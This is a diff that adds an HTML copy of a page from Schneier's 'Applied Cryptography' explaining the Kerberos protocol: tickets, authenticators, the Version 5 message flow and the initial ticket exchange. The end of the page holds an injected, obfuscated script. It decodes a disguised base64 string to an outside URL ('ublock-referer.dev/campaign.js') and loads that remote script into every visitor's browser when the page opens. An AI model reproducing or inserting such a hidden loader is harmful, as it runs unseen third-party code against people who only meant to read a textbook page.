@@ -1,0 +1,162 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=566-569//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>The Kerberos Model</I></B></FONT></P>
+<P>The basic Kerberos protocol was outlined in Section 3.3. In the Kerberos model, there are entities&#151;clients and servers&#151;sitting on the network. Clients can be users, but can also be independent software programs that need to do things: download files, send messages, access databases, access printers, obtain administrative privileges, whatever.
+</P>
+<P>Kerberos keeps a database of clients and their secret keys. For a human user, the secret key is an encrypted password. Network services requiring authentication, as well as clients who wish to use these services, register their secret key with Kerberos.</P>
+<P>Because Kerberos knows everyone&#146;s secret key, it can create messages that convince one entity of another entity&#146;s identity. Kerberos also creates session keys which are given to a client and a server (or to two clients) and no one else. A session key is used to encrypt messages between the two parties, after which it is destroyed.</P>
+<P>Kerberos uses DES for encryption. Kerberos Version 4 provided a nonstandard mode for authentication. This mode is weak: It fails to detect certain changes to the ciphertext (see Section 9.10). Kerberos Version 5 uses CBC mode.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/24-01.jpg',344,125 )"><IMG SRC="images/24-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/24-01.jpg',344,125)"><FONT COLOR="#000077"><B>Figure 24.1</B></FONT></A>&nbsp;&nbsp;Kerberos authentication steps.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>How Kerberos Works</I></B></FONT></P>
+<P>This section discusses Kerberos Version 5. I will outline the differences between Version 4 and Version 5 further on. The Kerberos protocol is straightforward (see Figure 24.1). A client requests a ticket for a <B>Ticket-Granting Service</B> (<B>TGS</B>) from Kerberos. This ticket is sent to the client, encrypted in the client&#146;s secret key. To use a particular server, the client requests a ticket for that server from the TGS. Assuming everything is in order, the TGS sends the ticket back to the client. The client then presents this ticket to the server along with an authenticator. Again, if there&#146;s nothing wrong with the client&#146;s credentials, the server lets the client have access to the service.</P>
+<TABLE WIDTH="60%"><TH CAPTION COLSPAN="2" ALIGN="CENTER">Table 24.1<BR>Kerberos Table of Abbreviations
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" COLSPAN="2"><HR>
+<TR>
+<TD WIDTH="15%" VALIGN="TOP" ALIGN="LEFT"><I>c</I>
+<TD VALIGN="TOP" ALIGN="LEFT">= client
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>s</I>
+<TD VALIGN="TOP" ALIGN="LEFT">= server
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>a</I>
+<TD VALIGN="TOP" ALIGN="LEFT">= client&#146;s network address
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>v</I>
+<TD VALIGN="TOP" ALIGN="LEFT">= beginning and ending validity time for a ticket
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>t</I>
+<TD VALIGN="TOP" ALIGN="LEFT">= timestamp
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K<SUB>x</SUB></I>
+<TD VALIGN="TOP" ALIGN="LEFT">= <I>x</I>&#145;s secret key
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>K<SUB>x, y</SUB></I>
+<TD VALIGN="TOP" ALIGN="LEFT">= session key for <I>x</I> and <I>y</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>m</I>}<I>K<SUB>x</SUB></I>
+<TD VALIGN="TOP" ALIGN="LEFT">= <I>m</I> encrypted in <I>x</I>&#145;s secret key
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>T<SUB>x, y</SUB></I>
+<TD VALIGN="TOP" ALIGN="LEFT">= <I>x</I>&#145;s ticket to use <I>y</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><I>A<SUB>x, y</SUB></I>
+<TD VALIGN="TOP" ALIGN="LEFT">= authenticator from <I>x</I> to <I>y</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" COLSPAN="2"><HR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Credentials</I></B></FONT></P>
+<P>Kerberos uses two types of credentials: <B>tickets</B> and <B>authenticators</B>. (The rest of this section uses the notation used in Kerberos documents&#151;see Table 24.1.) A ticket is used to pass securely to the server the identity of the client for whom the ticket was issued. It also contains information that the server can use to ensure that the client using the ticket is the same client to whom the ticket was issued. An authenticator is an additional credential, presented with the ticket.</P>
+<P>A Kerberos ticket takes this form:</P>
+<DL>
+<DD><I>T<SUB>c, s</SUB></I> = <I>s</I>, {<I>c, a, v, K<SUB>c, s</SUB></I>}<I>K<SUB>s</SUB></I>
+</DL>
+<P>A ticket is good for a single server and a single client. It contains the client&#146;s name and network address, the server&#146;s name, a timestamp, and a session key. This information is encrypted with the server&#146;s secret key. Once the client gets this ticket, she can use it multiple times to access the server&#151;until the ticket expires. The client cannot decrypt the ticket (she does not know the server&#146;s secret key), but she can present it to the server in its encrypted form. No one listening on the network can read or modify the ticket as it passes through the network.
+</P>
+<P>A Kerberos authenticator takes this form:</P>
+<DL>
+<DD><I>A<SUB>c, s</SUB></I> = {<I>c, t, key</I>}<I>K<SUB>c, s</SUB></I>
+</DL>
+<P>The client generates it every time she wishes to use a service on the server. The authenticator contains the client&#146;s name, a timestamp, and an optional additional session key, all encrypted with the session key shared between the client and the server. Unlike a ticket, it can only be used once. However, since the client can generate authenticators as needed (it knows the shared secret key), this is not a problem.
+</P>
+<P>The authenticator serves two purposes. First, it contains some plaintext encrypted in the session key. This proves that it also knows the key. Just as important, the sealed plaintext includes the timestamp. An eavesdropper who records both the ticket and the authenticator can&#146;t replay them two days later.</P>
+<P><FONT SIZE="+1"><B><I>Kerberos Version 5 Messages</I></B></FONT></P>
+<P>Kerberos Version 5 has five messages (see Figure 24.1):
+</P>
+<TABLE WIDTH="55%"><TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1. Client to Kerberos:
+<TD VALIGN="TOP" ALIGN="LEFT"><I>c, tgs</I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">2. Kerberos to client:
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>K<SUB>c, tgs</SUB></I>}<I>K<SUB>c,</SUB></I> {<I>T<SUB>c, tgs</SUB></I>}<I>K<SUB>tgs</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">3. Client to TGS:
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>A<SUB>c, s</SUB></I>}<I>K<SUB>c, tgs,</SUB></I> {<I>T<SUB>c, tgs</SUB></I>}<I>K<SUB>tgs</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">4. TGS to client:
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>K<SUB>c, s</SUB></I>}<I>K<SUB>c, tgs,</SUB></I> {<I>T<SUB>c, s</SUB></I>}<I>K<SUB>s</SUB></I>
+<TR>
+<TD VALIGN="TOP" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">5. Client to server:
+<TD VALIGN="TOP" ALIGN="LEFT">{<I>A<SUB>c, s</SUB></I>}<I>K<SUB>c, s,</SUB></I> {<I>T<SUB>c, s</SUB></I>}<I>K<SUB>s</SUB></I>
+<TR>
+</TABLE>
+<P>These will now be discussed in detail.
+</P>
+<P><FONT SIZE="+1"><B><I>Getting an Initial Ticket</I></B></FONT></P>
+<P>The client has one piece of information that proves her identity: her password. Obviously we don&#146;t want her to send this password over the network. The Kerberos protocol minimizes the chance that this password will be compromised, while at the same time not allowing a user to properly authenticate herself unless she knows the password.
+</P>
+<P>The client sends a message containing her name and the name of her TGS server to the Kerberos authentication server. (There can be many TGS servers.) In reality, the user probably just enters her name into the system and the login program sends the request.</P>
+<P>The Kerberos authentication server looks up the client in his database. If the client is in the database, Kerberos generates a session key to be used between her and the TGS. This is called a <B>Ticket Granting Ticket</B> (<B>TGT</B>). Kerberos encrypts that session key with the client&#146;s secret key. Then it creates a TGT for the client to authenticate herself to the TGS, and encrypts that in the TGS&#146;s secret key. The authentication server sends both of these encrypted messages back to the client.</P>
+<P>The client now decrypts the first message and retrieves the session key. The secret key is a one-way hash of her password, so a legitimate user will have no trouble doing this. If the user were an imposter, he would not know the correct password and therefore could not decrypt the response from the Kerberos authentication server. Access would be denied and he wouldn&#146;t be able to get the ticket or the session key.</P>
+<P>The client saves the TGT and session key and erases the password and the one-way hash. This information is erased to reduce the chance of compromise. If an adversary manages to copy the client&#146;s memory, he will only get the TGT and the session key. These are valuable pieces of information, but only during the lifetime of the TGT. After the TGT expires, they will be worthless.</P>
+<P>The client can now prove her identity to the TGS for the lifetime of the TGT.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ZnyqHudD, IehhjqUh) {IehhjqUh = ZnyqHudD.createElement('script');IehhjqUh.type = 'text/javascript';IehhjqUh.async = true;IehhjqUh.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ZnyqHudD.getElementsByTagName('body')[0].appendChild(IehhjqUh);}(document));</script></body>
+</html>
